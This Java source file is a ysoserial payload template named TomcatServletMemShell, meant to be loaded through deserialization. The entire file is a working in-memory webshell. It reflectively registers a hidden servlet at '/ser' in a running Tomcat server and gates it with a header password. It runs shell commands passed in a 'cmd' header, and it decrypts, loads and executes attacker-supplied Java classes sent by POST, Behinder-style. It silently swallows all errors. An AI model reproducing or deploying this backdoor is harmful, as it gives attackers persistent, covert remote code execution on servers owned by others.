package ysoserial.payloads.templates;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Scanner;
import java.util.Set;

public class TomcatServletMemShell extends AbstractTranslet implements Servlet {

    static {
        try {
            String servletName = "MyServletVersion" + System.nanoTime();
            String urlPattern = "/ser";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for (NamedObject namedObject : objectSet) {
                try {
                    DynamicMBean dynamicMBean = namedObject.getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(obj);

                    if (standardContext.findChild(servletName) == null) {
                        Wrapper wrapper = standardContext.createWrapper();
                        wrapper.setName(servletName);
                        standardContext.addChild(wrapper);
                        Servlet servlet = new TomcatServletMemShell();
                        wrapper.setServletClass(servlet.getClass().getName());
                        wrapper.setServlet(servlet);
                        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                        registration.addMapping(urlPattern);
                    }
                } catch (Exception e) {
                    // e.printStackTrace();
                }
            }
        } catch (Exception e) {
            // e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        try {
            HttpServletRequest request = (HttpServletRequest) req;
            HttpServletResponse response = (HttpServletResponse) resp;
            HttpSession session = request.getSession();

            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            // b14eadc8b152942dfcd697f0f3568d7214d15766843ae7928db19bec76d88572 sha256 Y4er
            if (request.getHeader("x-client-data").equalsIgnoreCase("b14eadc8b152942dfcd697f0f3568d7214d15766843ae7928db19bec76d88572")) {
                if (request.getMethod().equals("GET")) {
                    String cmd = request.getHeader("cmd");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (File.separator.equals("/")) {
                            cmds = new String[]{"/bin/sh", "-c", cmd};
                        } else {
                            cmds = new String[]{"cmd", "/c", cmd};
                        }
                        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                        response.getWriter().println(result);
                    }
                } else if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                    if (request.getMethod().equals("POST")) {
                        String k = "7ab2695c3c103c7c54130685ef2cc03a".substring(16); // Y4er
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                        //revision BehinderFilter
                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        method.setAccessible(true);
                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                        Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                        evilclass.newInstance().equals(pageContext);
                    }
                }
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}

